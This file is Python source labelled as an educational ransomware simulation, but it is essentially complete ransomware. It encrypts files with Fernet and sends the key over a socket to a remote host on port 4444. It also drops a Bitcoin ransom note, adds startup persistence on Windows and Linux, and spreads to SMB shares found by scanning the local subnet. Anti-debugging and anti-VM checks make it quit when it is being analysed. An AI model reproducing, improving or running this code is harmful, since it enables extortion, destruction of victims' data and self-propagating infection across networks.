"""
Advanced Implementation of Ransomware Simulation (Educational Purposes Only)

WARNING: This code is for educational purposes only. Running this code can cause permanent data loss. 
ONLY USE IN A CONTROLLED ISOLATED ENVIRONMENT, such as a virtual machine. 
Ransomware is a serious criminal offense that can have devastating consequences. 
This simulation is designed to educate cybersecurity professionals about the inner workings 
of ransomware and how to defend against it.

DO NOT UNDER ANY CIRCUMSTANCES use this code for malicious purposes.

SAFE PRACTICES:
  * Run this code in a controlled isolated environment (e.g., virtual machine).
  * Use dummy data that you can afford to lose.

DISCLAIMER: The authors are not responsible for any damages caused by misuse of this code.
"""

import os
import socket
import shutil
import getpass
import subprocess
import platform
import ctypes
import time
import netifaces
import psutil
import time
from threading import Thread
from cryptography.fernet import Fernet

# Paths and settings
key_file_path = "/home/ahmed_sobhi/Ahmed_Sobhi/My_Tools/Ransomware_Project/key.txt"
folder = '/home/ahmed_sobhi/Ahmed_Sobhi/My_Tools/Ransomware_Project/test'
directory = os.listdir(folder)
test_files = [file for file in directory]
ransom_note_path = os.path.join(folder, "README_FOR_DECRYPTION.txt")

# Ransom note content
ransom_note_content = """
Your files have been encrypted!

To retrieve your files, you need to pay a ransom.

Contact us at: hacker@example.com

Instructions:
1. Send 1 Bitcoin to the following address: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
2. Email your payment confirmation and your unique key to hacker@example.com.
3. You will receive a decryption tool after payment is verified.

If you do not pay within 72 hours, your files will be permanently deleted.

DO NOT TRY TO DECRYPT THE FILES YOURSELF!
"""

# Generating Key
def generate_key():
    key = Fernet.generate_key()
    with open(key_file_path, "wb") as key_file:
        key_file.write(key)
    return key

# Sending the key to the hacker using socket
def send_file(filename, host='192.168.124.52', port=4444):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))
        with open(filename, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                client_socket.sendall(data)

# Encryption Function
def encrypt_files(key):
    for file in test_files:
        file_path = os.path.join(folder, file)
        with open(file_path, "rb") as thefile:
            content = thefile.read()
        encrypted_content = Fernet(key).encrypt(content)
        with open(file_path, "wb") as thefile:
            thefile.write(encrypted_content)

# Persistence Mechanism
def create_persistence():
    if platform.system() == "Windows":
        persistence_path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ransomware_simulation.py"
        with open(persistence_path, "w") as f:
            f.write(__file__)
    else:
        persistence_path = f"/home/{getpass.getuser()}/.config/autostart/ransomware_simulation.desktop"
        with open(persistence_path, "w") as f:
            f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {__file__}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Ransomware Simulation")

# Network Propagation
def propagate():
    network_shares = find_network_shares()
    for share in network_shares:
        try:
            shutil.copyfile(__file__, os.path.join(share, "ransomware_simulation.py"))
        except Exception as e:
            print(f"Failed to copy to {share}: {e}")

def find_network_shares():
    shares = []
    if platform.system() == "Windows":
        output = subprocess.check_output("net view", shell=True).decode()
        lines = output.split("\n")
        for line in lines:
            if "\\" in line:
                share_name = line.split()[0]
                shares.append(share_name)
    else:
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    shares.extend(scan_network(ip))
    return shares

def scan_network(ip):
    shares = []
    base_ip = ".".join(ip.split(".")[:-1])
    for i in range(1, 255):
        target_ip = f"{base_ip}.{i}"
        try:
            output = subprocess.check_output(f"smbclient -L {target_ip} -N", shell=True, stderr=subprocess.STDOUT).decode()
            if "Sharename" in output:
                shares.append(f"\\\\{target_ip}\\share")
        except subprocess.CalledProcessError:
            continue
    return shares

# Leave Ransom Note
def leave_ransom_note():
    with open(ransom_note_path, "w") as ransom_note:
        ransom_note.write(ransom_note_content)

# Anti-Debugging and Anti-VM Techniques
def anti_debug():
    if platform.system() == "Windows":
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            exit(1)
        
        # Check for common debugger tools
        debugger_tools = [
            "vmware.exe", "vboxservice.exe", "vboxtray.exe", "xenservice.exe",
            "wireshark.exe", "procmon.exe", "procexp.exe", "ollydbg.exe",
            "x64dbg.exe", "x32dbg.exe", "idag.exe", "immunitydebugger.exe"
        ]
        for tool in debugger_tools:
            if tool in (p.name() for p in psutil.process_iter()):
                exit(1)
        
        # Check for VM artifacts
        vm_artifacts = [
            "C:\\WINDOWS\\system32\\drivers\\vmmouse.sys",
            "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
            "C:\\WINDOWS\\system32\\drivers\\vm3dmp.sys"
        ]
        for artifact in vm_artifacts:
            if os.path.exists(artifact):
                exit(1)
    else:
        # Check ASLR status on Linux
        if os.path.exists("/proc/sys/kernel/randomize_va_space"):
            with open("/proc/sys/kernel/randomize_va_space", "r") as f:
                if f.read().strip() != "2":
                    exit(1)
        
        # Check for VM artifacts on Linux
        vm_artifacts = [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor"
        ]
        for artifact in vm_artifacts:
            if os.path.exists(artifact):
                exit(1)
        
        # Check for sandbox artifacts
        sandbox_artifacts = [
            "/usr/bin/vboxadd",
            "/usr/bin/vmtoolsd",
            "/usr/bin/Xorg"
        ]
        for artifact in sandbox_artifacts:
            if os.path.exists(artifact):
                exit(1)

    # Timing checks
    start_time = time.time()
    for _ in range(10000):
        pass
    end_time = time.time()
    if end_time - start_time > 0.01:  # Example threshold
        exit(1)


# Multi-Threading Function
def run_in_threads(functions):
    threads = []
    for function in functions:
        thread = Thread(target=function)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

# Main Function
def main():
    anti_debug()
    
    key = generate_key()
    Thread(target=send_file, args=(key_file_path,)).start()
    
    run_in_threads([lambda: encrypt_files(key), leave_ransom_note, create_persistence, propagate])
    
    os.remove(key_file_path)
    print("Encryption complete. Your files have been encrypted and a ransom note has been left.")

if __name__ == "__main__":
    main()
